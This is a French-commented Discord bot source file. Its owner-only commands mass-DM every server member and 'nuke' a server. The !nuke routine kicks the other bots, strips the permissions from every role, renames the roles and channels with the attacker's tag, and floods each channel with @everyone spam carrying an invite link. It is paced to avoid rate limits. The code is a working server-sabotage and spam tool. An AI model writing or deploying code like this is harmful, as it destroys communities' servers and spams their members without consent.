const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
const http = require('http');

// Serveur HTTP pour garder Render actif 24/7
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot Godmode Operational!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Liste des IDs autorisés (Toi et 40fd)
const OWNERS = ['1166445202148442112', '330080470983245824'];

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
});

// ==========================================
// SÉCURITÉ ACTIVE : KICK INSTANTANÉ DES AUTRES BOTS
// ==========================================
client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        try {
            await member.kick('Anti-bot de sécurité activé.');
        } catch (err) {}
    }
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    const isOwner = OWNERS.includes(message.author.id);

    // ==========================================
    // 1. COMMANDE !DMALL
    // ==========================================
    if (message.content === '!dmall') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");

        const filter = m => m.author.id === message.author.id;
        
        try {
            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
            const m = collected.first();

            if (m.content.toLowerCase() === 'annuler') {
                return message.channel.send("❌ **Opération DMAll annulée.**");
            }

            const messageTemplate = m.content;

            const previewEmbed = new EmbedBuilder()
                .setColor('#FEE75C')
                .setTitle('⚠️ Confirmation requise - DMAll (Godmode Turbo)')
                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                );

            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });

            const buttonFilter = i => OWNERS.includes(i.user.id);
            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });

            buttonCollector.on('collect', async interaction => {
                if (interaction.customId === 'cancel_dmall') {
                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
                }

                if (interaction.customId === 'confirm_dmall') {
                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });

                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });

                    try {
                        await message.guild.members.fetch();
                        const members = message.guild.members.cache.filter(member => !member.user.bot);
                        const totalMembers = members.size;

                        let successCount = 0;
                        let failCount = 0;

                        for (const [id, member] of members) {
                            try {
                                const finalMessage = messageTemplate
                                    .replace(/\{mention\}/g, `<@${member.id}>`)
                                    .replace(/\{name\}/g, member.user.username);

                                await member.send(finalMessage);
                                successCount++;
                            } catch (err) {
                                failCount++;
                            }
                            await new Promise(resolve => setTimeout(resolve, 100)); 
                        }

                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });

                    } catch (error) {
                        message.channel.send("❌ Erreur lors du DMAll.");
                    }
                }
            });
        } catch (err) {
            message.channel.send("⌛ Temps écoulé.");
        }
    }

    // ==========================================
    // 2. COMMANDE !NUKE (Corrigée contre le rate-limit)
    // ==========================================
    if (message.content === '!nuke') {
        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");

        await message.reply("💥 **[NUKE GODMODE]** Destruction du serveur en cours...");

        try {
            // 1. Kicker les autres bots
            const members = await message.guild.members.fetch();
            for (const [id, m] of members) {
                if (m.user.bot && m.id !== client.user.id) {
                    await m.kick('Nuke Godmode').catch(() => {});
                    await new Promise(res => setTimeout(res, 100));
                }
            }

            // 2. Renommer et strip les rôles un par un avec une petite pause
            const roles = message.guild.roles.cache;
            for (const [id, role] of roles) {
                if (role.id !== message.guild.id && !role.managed) {
                    await role.edit({
                        name: 'ez by k2l',
                        permissions: new PermissionsBitField(0n)
                    }).catch(() => {});
                    await new Promise(res => setTimeout(res, 150));
                }
            }

            // 3. Renommer les salons et balancer les pings proprement
            const channels = message.guild.channels.cache;
            for (const [id, channel] of channels) {
                await channel.setName('ez-by-graveuhq').catch(() => {});
                await new Promise(res => setTimeout(res, 100));

                if (channel.isTextBased()) {
                    for (let i = 0; i < 10; i++) {
                        await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                        await new Promise(res => setTimeout(res, 200)); // Pause anti-spam API Discord
                    }
                }
            }

            await message.channel.send("💥 **[NUKE]** Serveur complètement détruit avec succès !");

        } catch (error) {
            console.error("Erreur critique Nuke :", error);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
